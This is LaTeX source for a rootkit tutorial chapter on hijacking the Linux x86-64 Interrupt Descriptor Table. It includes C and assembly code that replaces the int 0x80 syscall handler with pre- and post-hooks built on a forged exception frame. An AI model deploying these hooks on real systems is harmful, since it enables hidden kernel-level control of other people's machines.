%vol A3. 6
The IDT (Interrupt Descriptor Table) is a linear table of 256 entries which
associate an interrupt vector with a handler. When an interrupt is issued,
the CPU retrieve the number and call the associated handler.

The main reason we want to hook the idt is to replace the default handler for
the 0x80 entry, which is the number used by linux to make syscall from
userland.

\subsubsection{Taking control of the table}
\paragraph{Address of the IDT}\mbox{}\\
Retrieving the address of the IDT is trivial because it is stored in a
special CPU's register (IDTR) that can be accessed with the instructions
\cmd{lidt} (load IDT register) and \cmd{sidt} (store IDT register).

\begin{ccode}
static struct gate_struct64 *idt_table;
static unsigned short idt_table_sz;

static void inline local_store_idt(void *dtr) {
    asm volatile("sidt %0":"=m" (*((struct desc_ptr *)dtr)));
}

static void inline local_load_idt(void *dtr) {
    asm volatile("lidt %0"::"m" (*((struct desc_ptr *)dtr)));
}

static void idt_get_table(void) {
    struct desc_ptr idtr;

    local_store_idt(&idtr);
    idt_table = (struct gate_struct64 *)idtr.address;
    idt_table_sz = idtr.size;
}
\end{ccode}\\
\cmd{struct desc\_ptr} is a structure containing the size and the address of the
IDT used by Linux.


There is 2 different approachs to change a handler:
\begin{itemize}
    \item Change the entry directly in the table;
    \item Change the whole table.
\end{itemize}

\paragraph{Change an entry}\mbox{}\\
For security reasons, the IDT is read-only, which is not really a problem
since we know how to bypass the memory protection.

An IDT entry is not just a pointer to a handler, it also contains some flags.

\begin{ccode}
void idt_set_entry(unsigned long addr, int n) {
    idt_table[n].offset_high = (addr >> 32) & 0xffffffff;
    idt_table[n].offset_middle = (addr >> 16) & 0xffff;
    idt_table[n].offset_low = addr & 0xffff;
}

unsigned long idt_get_entry(int n) {
    return (((unsigned long)cur_idt_table[n].offset_high) << 32)
         + (((unsigned long)cur_idt_table[n].offset_middle) << 16)
         + (((unsigned long)cur_idt_table[n].offset_low));
}
\end{ccode}

\paragraph{Change the whole table}\mbox{}\\
The address of the table is stored in an unique location: in the CPU's IDTR.
If we change the value of the register with our table, all the futur accesses
will use our table instead of the old one. The advantage is that we do not need
to modify read-only data, but only a register.
Note that if you have a multi-core CPU, you will need to change the register
of each CPU. This can be done with the function \cmd{on\_each\_cpu}.

\begin{ccode}
static struct gate_struct64 new_idt_table[256];

static void substitute_idt_table(void) {
    struct desc_ptr idtr;

    /* Retrieve the original table */
    local_store_idt(&idtr);
    idt_table = (struct gate_struct64 *)idtr.address;
    idt_table_sz = idtr.size;

    memcpy(new_idt_table, idt_table, idt_table_sz);

    /* Set the new table in the CPUs'IDTR */
    idtr.address = (unsigned long)new_idt_table;
    idtr.size = idt_table_sz;
    on_each_cpu(local_load_idt, &idtr, 1);
}
\end{ccode}


\subsubsection{Creating hooks}
Now that we got the control of the table, it's time to modify the handlers!

When the CPU executes an exception or an interrupt handler, it first pushes
some datas on the stack in order to resume the execution of the code that
generate the interrupt. The following registers are pushed on the stack:
\begin{itemize}
    \item SS (Stack Segment) which represents the GDT entry used
    \item ESP (Stack Pointer)
    \item EFLAGS
    \item CS (Code Segment)
    \item EIP (Instruction Pointer)
\end{itemize}

Some exceptions push an additional value on the stack, used as an "error code".
It contains additional informations about the context of the exceptions. The
following exceptions push an error code:
\begin{multicols}{2}
  \begin{itemize}
    \item Double Fault (0x8)
    \item Invalid TSS (0xA)
    \item Segment Not Present (0xB)
    \item Stack-Segment Fault (0xC)
    \item General Protection Fault (0xD)
    \item Page Fault (0xE)
    \item Alignment Check (0x11)
    \item Security Exception (0x1E)
  \end{itemize}
\end{multicols}

\begin{figure}
  \hspace{-1.5cm}
  \begin{subfigure}{.5\textwidth}
    \begin{drawstack}[scale=.75]
      \startframe
      \cell{SS} \cellcom{0x20(\%esp)}
      \cell{ESP} \cellcom{0x18(\%esp)}
      \cell{EFLAGS} \cellcom{0x10(\%esp)}
      \cell{CS} \cellcom{0x8(\%esp)}
      \cell{EIP} \esp
      \finishframe{Exception\\Frame}
    \end{drawstack}
    \caption{Classical}
  \end{subfigure}
  \begin{subfigure}{.5\textwidth}
    \begin{drawstack}[scale=.75]
      \startframe
      \cell{SS} \cellcom{0x28(\%esp)}
      \cell{ESP} \cellcom{0x20(\%esp)}
      \cell{EFLAGS} \cellcom{0x18(\%esp)}
      \cell{CS} \cellcom{0x10(\%esp)}
      \cell{EIP} \cellcom{0x8(\%esp)}
      \finishframe{Exception\\Frame}
      \cell{Error Code} \esp
    \end{drawstack}
    \caption{With an error code}
  \end{subfigure}
  \caption{Interrupt Stack Layout}
\end{figure}

When the handler has finished his job, it jumps back to the code that has been
interrupted using the \cmd{iret} instructions which expect the 5 values to be
on the stack. Indeed, \cmd{iret} read and set the value of \cmd{SS, RSP,
RFLAGS CS,} and \cmd{RIP}. If you want to return at the point where the code
has been interrupted, \cmd{esp} should be the same at the beginning and at the
end of the interrupt handler.

\begin{figure}[h]
  \centering
  \includegraphics[width=1.0\textwidth]{res/idt.pdf}
\end{figure}

The goal of this chapter is to run a hook before and after the original handler
thus allowing the rootkit to read and/or modify registers or memory to alter
the normal behaviour. Our pre-hook must choose if it want the original handler
to be run.

\paragraph{Pre Hooking}\mbox{}\\
Executing a hook before the original handler is pretty easy, you just need
to replace the IDT entry with a fake handler that just call a hook, then jump
to the original handler. You just need to be careful not to change the
exception frame and \cmd{esp}.

In some situations you don't want the original handler to be executed and just
want to return from the interrupt (for example when you don't want a program
to use some syscalls).

\begin{figure}[h]
  \centering
  \includegraphics[width=1.0\textwidth]{res/idt_pre-hooking.pdf}
\end{figure}

The implementation of such a hook look like this:

\begin{pseudocode}
save_regs
ret = pre_hook(regs, error_code)
restore_regs
if ret > 0  // Return from int. (do not execute orig hdlr)
    saved_return_address += ret
    iret
original_handler()
\end{pseudocode}\\
\todo{schema pre hook}

\paragraph{Post Hooking}\mbox{}\\
Post hooking the handler is a bit more tricky, because you can't just add
a call to your hook after it since the handler return with \cmd{iret}.
\\
\begin{pseudocode}
pre_hook();
orig_hdlr();
post_hook(); // never executed because orig_hdrl return with iret to
             // the code that has been interrupted.
\end{pseudocode}
\\

If we want our post-hook to be executed, we need to find a way to make the
original handler return to it. The interesting thing with \cmd{iret} is that
the instruction can return to code regardless of its location or the DPL
(RING 0 or RING 3).
The idea is to make a post-hook that push a fake exception frame on the stack
in order to control the return address of \cmd{iret}.
We can push the address of a piece of code that will call our post-hook and
then return using the real frame exception.

\begin{figure}[h]
  \begin{drawstack}[scale=.75]
    \startframe
    \cell{SS} \cellcom{0x48(\%esp)}
    \cell{ESP} \cellcom{0x40(\%esp)}
    \cell{EFLAGS} \cellcom{0x38(\%esp)}
    \cell{CS} \cellcom{0x30(\%esp)}
    \cell{EIP} \cellcom{0x28(\%esp)}
    \finishframe{Exception\\Frame}
    \startframe
    \cell{SS = 0x18} \cellcom{0x20(\%esp)}
    \cell{ESP} \cellcom{0x18(\%esp)}
    \cell{EFLAGS = 0} \cellcom{0x10(\%esp)}
    \cell{CS = 0x10} \cellcom{0x8(\%esp)}
    \cell{EIP = @post\_hdrl} \esp
    \finishframe{Fake\\Exception\\Frame}
  \end{drawstack}
  \caption{Stack With a fake exception frame}
  \label{fake_int_frame}
\end{figure}

With a configuration like in ~\ref{fake_int_frame}, when the original handler
execute the \cmd{iret}, it will pop the fake frame and thus jump to the
\cmd{post\_hdlr}, a simple piece of code that call our hook and \cmd{iret}.
Since the original handler popped the fake frame, \cmd{post\_hdlr} will use
the real one, and thus resuming the execution of the interrupted code.

The pseudocode looks like this:\\
\begin{pseudocode}
fake_hdlr:
  save_regs
  ret = pre_hook(regs, err)
  restore_regs
  if ret > 0
      saved_return_address += ret
      iret
  if ret == 0
      push fake_ss (0x18)         // if this fake frame is pushed,
      push fake_rsp               // original_handler will return
      push fake_rflags            // to post_hdrl
      push fake_cs (0x10)
      push fake_rip (&post_hdlr)
  original_handler()

post_hdlr:
  post_hook(regs, err)
  iret                           //use the real frame this time
\end{pseudocode}

\begin{figure}[h]
  \centering
  \includegraphics[width=1.0\textwidth]{res/idt_hooking.pdf}
\end{figure}

\begin{asmcode}
idt_fake_hdlr_0x80:
  cli
  movq %rsp, %r8                          ;save rsp, we'll use it later
  save_regs
  movq %rsp, %rdi                         ;1st arg: pt_regs
  callq *(idt_0x80_pre_hook)
  cmp $0, %eax
  jg iret_now                             ;if ret > 0, do not exec orig_hdlr
  restore_regs
  jl call_orig                            ;if ret < 0, do not push a fake frame
                                          ;  --> no post-hook
                                          ;else push a fake frame
  sub $0x28, %rsp                         ;fake cpu exception frame
  movq $0x18, 0x20(%rsp)                  ;SS
  movq %r8, 0x18(%rsp)                    ;RSP
  movq $0x0, 0x10(%rsp)                   ;EFLAGS
  movq $0x10, 0x8(%rsp)                   ;CS
  movq $post_hdlr, %r8
  movq %r8, 0x0(%rsp)                     ;RIP
  call_orig:
  jmp *(idt_0x80_orig)

post_hdlr:
  save_regs
  movq %rsp, %rdi                         ;1st arg: pt_regs
  callq *(idt_0x80_post_hook)
  restore_regs
  iretq

iret_now:
  ;Increment the return address with the result of the pre-hook
  add %rax, 0x88(%rsp)
  restore_regs
  iretq
\end{asmcode}
\\
Note: a more generic code to define fake handlers can be found at
\cmd{core/idt\_hdlrs.S}
